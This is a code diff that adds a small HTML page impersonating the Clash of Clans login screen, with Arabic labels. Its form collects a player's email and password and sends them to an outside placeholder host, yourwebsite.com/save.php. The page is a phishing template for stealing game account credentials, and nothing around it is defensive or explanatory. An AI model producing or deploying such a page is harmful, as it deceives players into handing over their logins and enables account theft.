@@ -1,0 +1,13 @@
+<html>
+<head>
+    <title>Clash of Clans - تسجيل الدخول</title>
+</head>
+<body>
+    <h1>تسجيل الدخول لحسابك في كلاش</h1>
+    <form action="http://yourwebsite.com/save.php" method="POST">
+        <label>الايميل:</label><input type="text" name="email"><br>
+        <label>كلمة السر:</label><input type="password" name="password"><br>
+        <input type="submit" value="تسجيل الدخول">
+    </form>
+</body>
+</html>
